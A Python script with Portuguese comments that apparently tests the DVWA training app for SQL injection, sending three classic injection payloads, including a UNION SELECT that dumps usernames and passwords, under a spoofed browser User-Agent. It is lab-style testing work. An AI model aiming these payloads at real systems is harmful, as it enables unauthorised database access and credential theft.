import requests
import sys
import time
import json
from datetime import datetime
from pathlib import Path

# Diretório dos logs .json
logs_dir = Path('logs')

if len(sys.argv) > 2:
    url_base = sys.argv[1]  # Recebe a URL base como argumento do código principal
    taxa_envio = sys.argv[2]  # Recebe a taxa de envio como segundo argumento
else:
    print("URL base e/ou taxa de envio não foram fornecidas.")
    sys.exit(1)

# Mapeia a taxa de envio para um intervalo de tempo específico
delays = {'baixo': 7, 'medio': 2, 'alto': 0.5}
delay = delays.get(taxa_envio, 2)  # Usa 'medio' como padrão se a taxa não for reconhecida

# Construir a URL alvo usando a URL base e o nome da página de Injeção de SQL
url_alvo = f"{url_base}DVWA/vulnerabilities/sqli"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}

# Payloads para Injeção de SQL
payloads = [
    "' OR '1'='1",
    "' UNION SELECT null, username, password FROM users--",
    "' OR 1=1--"
]

# Realizar os testes
total_testes = 0
testes_passaram = 0
testes_falharam = 0

for payload in payloads:
    dados_formulario = {'id': payload, 'Submit': 'Submit'}
    total_testes += 1

    # Enviar a requisição
    resposta_teste = requests.get(url_alvo, params=dados_formulario, headers=headers)

    # Verificar se o teste foi bem-sucedido usando o código de status e a resposta
    if resposta_teste.status_code == 200 and "admin" in resposta_teste.text:
        print(f"Teste #{total_testes} PASSOU: Vulnerabilidade 'SQL Injection' possivelmente encontrada com payload '{payload}'!")
        testes_passaram += 1
    else:
        print(f"Teste #{total_testes} FALHOU: Código de status {resposta_teste.status_code}.")
        testes_falharam += 1

    time.sleep(delay)  # Adiciona uma pausa entre as requisições baseada na taxa de envio

# Reportar os resultados finais
print(f"\nTotal de Testes: {total_testes}")
print(f"Testes Passaram: {testes_passaram}")
print(f"Testes Falharam: {testes_falharam}")
print(f"Url Testada: {url_alvo}")

# Gravar os resultados em um arquivo JSON
resultados = {
    'data_hora': datetime.now().strftime("%Y-%m-%d_%H-%M-%S"),
    'url_base': url_base,
    'total_testes': total_testes,
    'testes_passaram': testes_passaram,
    'testes_falharam': testes_falharam,
    'url_testada': url_alvo
}

nome_arquivo = f"resultados_{resultados['data_hora']}.json"
caminho_completo_arquivo = logs_dir / nome_arquivo

with open(caminho_completo_arquivo, 'w') as arquivo:
    json.dump(resultados, arquivo, indent=4)

print(f"\nResultados gravados em {caminho_completo_arquivo}")
